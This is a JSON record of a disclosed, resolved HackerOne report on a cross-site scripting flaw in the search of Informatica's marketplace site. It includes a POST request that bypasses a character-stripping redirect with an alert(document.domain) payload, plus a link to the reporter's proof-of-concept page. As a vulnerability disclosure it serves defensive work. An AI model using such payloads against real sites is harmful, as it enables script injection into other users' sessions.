{"id":200034,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMDAwMzQ=","url":"https://hackerone.com/reports/200034","title":"[marketplace.informatica.com] Search XSS","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2017-01-20T21:00:43.260Z","submitted_at":"2017-01-20T21:00:43.260Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"s_p_q_r","url":"/s_p_q_r","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/032/547/1d8b3feccf1a8281a2285cdbfc482aaf3b046b22_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":453,"url":"https://hackerone.com/informatica","handle":"informatica","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Informatica","twitter_handle":"informatica","website":"https://www.informatica.com/","about":"Informatica Corporation is the world’s number one independent provider of data integration software."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-05-22T04:08:23.983Z","bug_reporter_agreed_on_going_public_at":"2017-04-26T11:51:48.212Z","team_member_agreed_on_going_public_at":"2017-05-22T04:08:23.950Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The search query parameter is put into Javascript to set the localStorage item:\n\nhttps://marketplace.informatica.com/search-solr.jspa?q=%foo%\n\n```javascript\nlocalStorage.setItem(\"searchTerm\", \"%foo%\");\n```\n\nAttempts to inject XSS payloads are blocked by redirection that removes special chars from the URL:\n\n```http\nGET /search-solr.jspa?q=aaa%22bbb%27ccc%3Cddd%3Eeee HTTP/1.1\nHost: marketplace.informatica.com\n\nHTTP/1.0 302 Found\nLocation: https://marketplace.informatica.com/search-solr.jspa?q=aaabbbcccdddeee\n```\n\nHowever it turns out the search param can be successfully submitted via POST — the following request popups an alert:\n\n```http\nPOST /search-solr.jspa HTTP/1.1\nHost: marketplace.informatica.com\n\nq=%22-alert%28document.domain%29-%22\n```\n\n**PoC:**\n\nhttp://spqr.zz.mu/info_mp.php?key=066c1cac-b380-4455-9d36-4086dd999dd9\n\nTested with latest Firefox and Chrome.","vulnerability_information_html":"\u003cp\u003eThe search query parameter is put into Javascript to set the localStorage item:\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"https://marketplace.informatica.com/search-solr.jspa?q=%foo%\" href=\"/redirect?url=https%3A%2F%2Fmarketplace.informatica.com%2Fsearch-solr.jspa%3Fq%3D%25foo%25\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://marketplace.informatica.com/search-solr.jspa?q=%foo%\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003elocalStorage\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetItem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003esearchTerm\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e%foo%\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAttempts to inject XSS payloads are blocked by redirection that removes special chars from the URL:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/search-solr.jspa?q=aaa%22bbb%27ccc%3Cddd%3Eeee\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003emarketplace.informatica.com\u003c/span\u003e\n\nHTTP/1.0 302 Found\nLocation: https://marketplace.informatica.com/search-solr.jspa?q=aaabbbcccdddeee\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eHowever it turns out the search param can be successfully submitted via POST — the following request popups an alert:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003ePOST\u003c/span\u003e \u003cspan class=\"nn\"\u003e/search-solr.jspa\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003emarketplace.informatica.com\u003c/span\u003e\n\nq=%22-alert%28document.domain%29-%22\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003e\u003cstrong\u003ePoC:\u003c/strong\u003e\u003c/p\u003e\n\n\u003cp\u003e\u003ca title=\"http://spqr.zz.mu/info_mp.php?key=066c1cac-b380-4455-9d36-4086dd999dd9\" href=\"/redirect?url=http%3A%2F%2Fspqr.zz.mu%2Finfo_mp.php%3Fkey%3D066c1cac-b380-4455-9d36-4086dd999dd9\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://spqr.zz.mu/info_mp.php?key=066c1cac-b380-4455-9d36-4086dd999dd9\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eTested with latest Firefox and Chrome.\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-05-26T11:51:48.263Z","allow_singular_disclosure_after":-113418066.80363187,"singular_disclosure_allowed":true,"vote_count":4,"voters":["eveeez","japz","spetr0x","mrr3boot"],"severity":{"rating":"high","author_type":"Team"},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1433559,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Btw noticed a strange thing: non-encoded quotes are not removed by this redirection:\n\n```http\nGET /search-solr.jspa?q=aaa\"bbb'ccc\u003cddd\u003eeee HTTP/1.1\nHost: marketplace.informatica.com\n```\n```http\nHTTP/1.0 302 Found\nLocation: https://marketplace.informatica.com/search-solr.jspa?q=aaa\"bbbcccdddeee\n```\n\nSo the https://marketplace.informatica.com/search-solr.jspa?q=aaa\"bbbcccdddeee link will break the JS in IE and Edge:\n\n```javascript\nlocalStorage.setItem(\"searchTerm\", \"aaa\"bbbcccdddeee\");\n```\n\nOf course the https://marketplace.informatica.com/search-solr.jspa?q=\"-alert(document.domain)-\" XSS attempt will be blocked by the browser here, but better to fix it anyway I think.","markdown_message":"\u003cp\u003eBtw noticed a strange thing: non-encoded quotes are not removed by this redirection:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"nf\"\u003eGET\u003c/span\u003e \u003cspan class=\"nn\"\u003e/search-solr.jspa?q=aaa\u0026quot;bbb\u0026#39;ccc\u0026lt;ddd\u0026gt;eee\u003c/span\u003e \u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.1\u003c/span\u003e\n\u003cspan class=\"na\"\u003eHost\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003emarketplace.informatica.com\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight http\"\u003e\u003ccode\u003e\u003cspan class=\"k\"\u003eHTTP\u003c/span\u003e\u003cspan class=\"o\"\u003e/\u003c/span\u003e\u003cspan class=\"m\"\u003e1.0\u003c/span\u003e \u003cspan class=\"m\"\u003e302\u003c/span\u003e \u003cspan class=\"ne\"\u003eFound\u003c/span\u003e\n\u003cspan class=\"na\"\u003eLocation\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003ehttps://marketplace.informatica.com/search-solr.jspa?q=aaa\u0026quot;bbbcccdddeee\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo the \u003ca title=\"https://marketplace.informatica.com/search-solr.jspa?q=aaa%22bbbcccdddeee\" href=\"/redirect?url=https%3A%2F%2Fmarketplace.informatica.com%2Fsearch-solr.jspa%3Fq%3Daaa%2522bbbcccdddeee\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://marketplace.informatica.com/search-solr.jspa?q=aaa%22bbbcccdddeee\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e link will break the JS in IE and Edge:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"nx\"\u003elocalStorage\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetItem\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003esearchTerm\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eaaa\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"nx\"\u003ebbbcccdddeee\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e);\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOf course the \u003ca title=\"https://marketplace.informatica.com/search-solr.jspa?q=%22-alert(document.domain)-\" href=\"/redirect?url=https%3A%2F%2Fmarketplace.informatica.com%2Fsearch-solr.jspa%3Fq%3D%2522-alert%28document.domain%29-\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://marketplace.informatica.com/search-solr.jspa?q=%22-alert(document.domain)-\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot; XSS attempt will be blocked by the browser here, but better to fix it anyway I think.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-20T21:06:51.474Z","updated_at":"2017-01-20T21:06:51.474Z","actor":{"username":"s_p_q_r","cleared":false,"url":"/s_p_q_r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/547/1d8b3feccf1a8281a2285cdbfc482aaf3b046b22_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1447554,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hello @s_p_q_r \n\nThanks for the report. we are verifying the issue. Will keep you posted. ","markdown_message":"\u003cp\u003eHello \u003ca href=\"/s_p_q_r\"\u003e@s_p_q_r\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003eThanks for the report. we are verifying the issue. Will keep you posted. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-01-27T08:28:57.846Z","updated_at":"2017-01-27T08:28:57.846Z","actor":{"username":"tarantula_hawk","cleared":false,"url":"/tarantula_hawk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1447570,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2017-01-27T08:45:22.982Z","updated_at":"2017-01-27T08:45:22.982Z","actor":{"username":"tarantula_hawk","cleared":false,"url":"/tarantula_hawk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1507426,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-02-27T06:33:51.348Z","updated_at":"2017-02-27T06:33:51.348Z","additional_data":{"old_severity":null,"new_severity":"High","old_severity_id":null,"new_severity_id":28185},"actor":{"username":"tarantula_hawk","cleared":false,"url":"/tarantula_hawk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1521119,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@s_p_q_r \n\nPlease confirm the closure.","markdown_message":"\u003cp\u003e\u003ca href=\"/s_p_q_r\"\u003e@s_p_q_r\u003c/a\u003e \u003c/p\u003e\n\n\u003cp\u003ePlease confirm the closure.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-06T07:08:13.711Z","updated_at":"2017-03-06T07:08:13.711Z","actor":{"username":"tarantula_hawk","cleared":false,"url":"/tarantula_hawk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1552762,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nYep, fixed now, sorry for the delay. Gonna check the others in a while.","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eYep, fixed now, sorry for the delay. Gonna check the others in a while.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-03-20T17:29:49.953Z","updated_at":"2017-03-20T17:29:49.953Z","actor":{"username":"s_p_q_r","cleared":false,"url":"/s_p_q_r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/547/1d8b3feccf1a8281a2285cdbfc482aaf3b046b22_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1554773,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-21T15:17:12.750Z","updated_at":"2017-03-21T15:17:12.750Z","actor":{"username":"tarantula_hawk","cleared":false,"url":"/tarantula_hawk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"s_p_q_r","url":"/s_p_q_r"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1554774,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-03-21T15:17:27.032Z","updated_at":"2017-03-21T15:17:27.032Z","actor":{"url":"/informatica","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/6yxveqohTKjQLQyJm5Xv7Eye/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Informatica"}},"reporter":{"username":"s_p_q_r","url":"/s_p_q_r"},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1637247,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-04-26T11:51:48.232Z","updated_at":"2017-04-26T11:51:48.232Z","first_to_agree":true,"actor":{"username":"s_p_q_r","cleared":false,"url":"/s_p_q_r","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/032/547/1d8b3feccf1a8281a2285cdbfc482aaf3b046b22_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1690443,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-22T04:08:23.966Z","updated_at":"2017-05-22T04:08:23.966Z","actor":{"username":"tarantula_hawk","cleared":false,"url":"/tarantula_hawk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1690444,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-05-22T04:08:23.995Z","updated_at":"2017-05-22T04:08:23.995Z","actor":{"username":"tarantula_hawk","cleared":false,"url":"/tarantula_hawk","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"informatica","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}